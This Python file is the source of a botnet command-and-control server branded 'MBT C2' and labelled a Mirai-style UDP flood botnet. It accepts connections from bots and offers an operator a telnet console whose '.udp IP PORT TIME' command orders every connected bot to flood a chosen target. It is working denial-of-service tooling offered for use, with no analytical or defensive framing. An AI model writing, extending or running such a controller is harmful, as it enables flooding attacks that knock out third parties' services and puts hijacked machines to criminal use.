#!/usr/bin/env python3
"""
MBT C2 - FULL DURATION ANIMATIONS
girl.tfx on connect | roadman.tfx loops for entire attack
"""

import socket
import threading
import time
import os
from datetime import datetime

ADMIN_PORT = 23
BOT_PORT = 1337
ANIMATION_DIR = "./animations"
GIRL_ANIMATION = "girl.tfx"
ROADMAN_ANIMATION = "roadman.tfx"

class MBTC2:
    def __init__(self):
        self.bots = {}
        self.attacks = {}
        self.attack_id = 0
        self.running = True
        self.bot_counter = 0
        
    def load_animation(self, filename):
        path = os.path.join(ANIMATION_DIR, filename)
        if not os.path.exists(path):
            return None
        with open(path, 'r') as f:
            content = f.read()
        if '---' in content:
            return [f.strip() for f in content.split('---') if f.strip()]
        return [content]
    
    def play_animation_loop(self, sock, filename, duration):
        """Play animation in a loop for specified duration"""
        frames = self.load_animation(filename)
        if not frames:
            return
        
        end_time = time.time() + duration
        
        def animate():
            while time.time() < end_time and sock.fileno() != -1:
                for frame in frames:
                    if time.time() >= end_time:
                        break
                    try:
                        sock.send(b"\033[2J\033[H")
                        sock.send(frame.encode() + b"\r\n")
                        time.sleep(0.1)
                    except:
                        return
        
        threading.Thread(target=animate, daemon=True).start()
    
    def send_banner(self, sock):
        banner = """
\033[2J\033[H
\033[1;36m
+==============================================================================+
|                                                                              |
|                    ███╗   ███╗██████╗ ████████╗                              |
|                    ████╗ ████║██╔══██╗╚══██╔══╝                              |
|                    ██╔████╔██║██████╔╝   ██║                                 |
|                    ██║╚██╔╝██║██╔══██╗   ██║                                 |
|                    ██║ ╚═╝ ██║██████╔╝   ██║                                 |
|                    ╚═╝     ╚═╝╚═════╝    ╚═╝                                 |
|                                                                              |
|                         \033[1;33m#darkness  #frosty2\033[1;36m                                 |
|                                                                              |
+==============================================================================+
|  \033[1;32mUDP FLOOD BOTNET - MIRAI STYLE\033[1;36m                                             |
|  Commands: .udp <IP> <PORT> <TIME>  |  .bots  |  .help  |  .quit             |
+==============================================================================+\033[0m
\033[1;33m[MBT]\033[1;32m$\033[0m """
        sock.send(banner.encode())
    
    def show_help(self, sock):
        help_text = """
\033[1;36m+----------------------------------------------------------------------+
| \033[1;33mCOMMANDS                                                     \033[1;36m|
+----------------------------------------------------------------------+
|                                                                      |
|   \033[1;32m.help\033[0m      - This menu                                        |
|   \033[1;32m.clear\033[0m     - Clear screen                                      |
|   \033[1;32m.bots\033[0m      - List bots                                         |
|   \033[1;32m.udp\033[0m       - \033[1;31m.udp <IP> <PORT> <SECONDS>\033[0m                   |
|   \033[1;32m.stop\033[0m      - Stop all attacks                                   |
|   \033[1;32m.quit\033[0m      - Exit                                              |
|                                                                      |
+----------------------------------------------------------------------+\033[0m
\033[1;33m[MBT]\033[1;32m$\033[0m """
        sock.send(help_text.encode())
    
    def show_bots(self, sock):
        if not self.bots:
            sock.send(b"\r\n\033[1;33m[!] 0 bots online\033[0m\r\n")
        else:
            msg = f"\r\n\033[1;36m+--------------------------------------+\n"
            msg += f"| \033[1;33mBOTS ONLINE: {len(self.bots)}\033[1;36m                           |\n"
            msg += f"+--------------------------------------+\n"
            for bid, info in list(self.bots.items())[:20]:
                msg += f"| \033[1;32m{bid:3}\033[1;36m | \033[1;33m{info['ip']:15}\033[1;36m                |\n"
            msg += f"+--------------------------------------+\033[0m\n"
            sock.send(msg.encode())
        sock.send(b"\033[1;33m[MBT]\033[1;32m$\033[0m ")
    
    def udp_attack(self, ip, port, duration, sock):
        if not self.bots:
            sock.send(b"\r\n\033[1;33m[!] no bots\033[0m\r\n")
            sock.send(b"\033[1;33m[MBT]\033[1;32m$\033[0m ")
            return
        
        # Play roadman.tfx animation for the FULL duration
        self.play_animation_loop(sock, ROADMAN_ANIMATION, duration)
        
        self.attack_id += 1
        aid = self.attack_id
        
        # Send UDP command to all bots
        cmd = f"UDP {ip} {port} {duration}\n"
        for bid, info in self.bots.items():
            try:
                info['socket'].send(cmd.encode())
            except:
                pass
        
        self.attacks[aid] = {
            'target': f"{ip}:{port}",
            'duration': duration,
            'bots': len(self.bots),
            'end': time.time() + duration
        }
        
        # Send attack confirmation (will be shown after animation)
        def show_confirmation():
            time.sleep(duration)
            sock.send(f"\r\n\033[1;32m[ATTACK COMPLETE] {ip}:{port} | {duration}s | {len(self.bots)} bots\033[0m\r\n".encode())
            self.send_banner(sock)
        
        threading.Thread(target=show_confirmation, daemon=True).start()
        
        # Auto-remove after duration
        def end_attack():
            time.sleep(duration)
            if aid in self.attacks:
                del self.attacks[aid]
        threading.Thread(target=end_attack, daemon=True).start()
    
    def stop_all(self, sock):
        for bid, info in self.bots.items():
            try:
                info['socket'].send(b"STOP\n")
            except:
                pass
        self.attacks.clear()
        sock.send(b"\r\n\033[1;31m[STOPPED] all attacks\033[0m\r\n")
        sock.send(b"\033[1;33m[MBT]\033[1;32m$\033[0m ")
    
    def handle_admin(self, sock, addr):
        print(f"[+] Admin: {addr[0]}")
        
        # Play girl.tfx animation on connect
        self.play_animation_loop(sock, GIRL_ANIMATION, 3)
        
        # Send banner
        self.send_banner(sock)
        
        while self.running:
            try:
                sock.settimeout(0.5)
                data = sock.recv(1024)
                if not data:
                    break
                
                cmd = data.decode(errors='ignore').strip().lower()
                
                if not cmd:
                    continue
                
                if cmd == '.help':
                    self.show_help(sock)
                elif cmd == '.clear':
                    self.send_banner(sock)
                elif cmd == '.bots':
                    self.show_bots(sock)
                elif cmd.startswith('.udp'):
                    parts = cmd.split()
                    if len(parts) == 4:
                        try:
                            self.udp_attack(parts[1], int(parts[2]), int(parts[3]), sock)
                        except:
                            sock.send(b"\r\n\033[1;31m[!] invalid\033[0m\r\n")
                            sock.send(b"\033[1;33m[MBT]\033[1;32m$\033[0m ")
                    else:
                        sock.send(b"\r\n\033[1;33m[!] .udp IP PORT TIME\033[0m\r\n")
                        sock.send(b"\033[1;33m[MBT]\033[1;32m$\033[0m ")
                elif cmd == '.stop':
                    self.stop_all(sock)
                elif cmd == '.quit':
                    sock.send(b"\r\n\033[1;35m#darkness #frosty2\033[0m\r\n")
                    break
                else:
                    sock.send(b"\r\n\033[1;31m[!] unknown\033[0m\r\n")
                    sock.send(b"\033[1;33m[MBT]\033[1;32m$\033[0m ")
                    
            except socket.timeout:
                continue
            except:
                break
        
        sock.close()
        print(f"[-] Admin: {addr[0]} disconnected")
    
    def handle_bot(self, sock, addr):
        self.bot_counter += 1
        bid = self.bot_counter
        self.bots[bid] = {'socket': sock, 'ip': addr[0]}
        print(f"[+] Bot #{bid}: {addr[0]}")
        
        try:
            sock.send(b"PONG\n")
            while self.running:
                try:
                    sock.settimeout(10)
                    data = sock.recv(1024)
                    if not data:
                        break
                except socket.timeout:
                    sock.send(b"PING\n")
                    continue
                except:
                    break
        except:
            pass
        
        if bid in self.bots:
            del self.bots[bid]
        print(f"[-] Bot #{bid}: offline")
        sock.close()
    
    def start(self):
        admin = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        admin.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        admin.bind(('0.0.0.0', ADMIN_PORT))
        admin.listen(50)
        
        bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bot.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        bot.bind(('0.0.0.0', BOT_PORT))
        bot.listen(1000)
        
        print("\033[1;36m")
        print("+==============================================================================+")
        print("|                    MBT C2 - FULL DURATION ANIMATIONS                          |")
        print("|                   girl.tfx on connect | roadman.tfx on attack                |")
        print("|                             #darkness #frosty2                               |")
        print("+==============================================================================+")
        print(f"|  Admin:  telnet 0.0.0.0 {ADMIN_PORT}                                            |")
        print(f"|  Bot:    0.0.0.0:{BOT_PORT}                                                      |")
        print("+==============================================================================+\033[0m")
        
        self.bot_counter = 0
        
        while self.running:
            try:
                admin.settimeout(0.5)
                bot.settimeout(0.5)
                
                try:
                    a, addr = admin.accept()
                    threading.Thread(target=self.handle_admin, args=(a, addr), daemon=True).start()
                except:
                    pass
                
                try:
                    b, addr = bot.accept()
                    threading.Thread(target=self.handle_bot, args=(b, addr), daemon=True).start()
                except:
                    pass
                    
            except KeyboardInterrupt:
                break
        
        admin.close()
        bot.close()

if __name__ == "__main__":
    c2 = MBTC2()
    try:
        c2.start()
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Shutdown\033[0m")
